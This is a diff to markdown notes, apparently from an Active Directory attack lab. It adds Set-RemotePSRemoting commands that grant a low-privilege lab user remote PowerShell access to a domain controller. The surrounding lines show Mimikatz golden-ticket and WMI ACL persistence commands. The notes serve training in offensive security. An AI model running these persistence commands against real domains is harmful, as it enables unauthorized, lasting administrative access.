@@ -525,6 +525,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
   - We need to replace the SID with the SID of account which we would like to use. The account will have full access over the particular namespaces.
 
 **ACLs can be modified to allow non admin users access to securable objects**
+- We must run the script as Domain Administrator 
 - On local machine for student1:
   - `Set-RemoteWMI -Username student1 -Verbose`
 - On remote machine for student1 without explicit credentials
@@ -533,3 +534,11 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
   - `Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Credential Administrator -namespace `root\cimv2` -Verbose`
 - On remote machine remove permissions
   - `Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc-namespace 'root\cimv2' -Remove -Verbose`
+
+**Now Access the shell with PowerShell Remoting**
+- On local machiine for student1
+  - `Set-RemotePSRemoting -UserName student1 -Verbose`
+- On remote machine for student1 without credentials:
+  - `Set-RemotePSRemoting -UserName student1 -ComputerName dcorp-dc -Verbose`
+- On remote machine, remove the permissions:
+  - `Set-RemotePSRemoting -UserName student1 -ComputerName dcorp-dc -Remove`
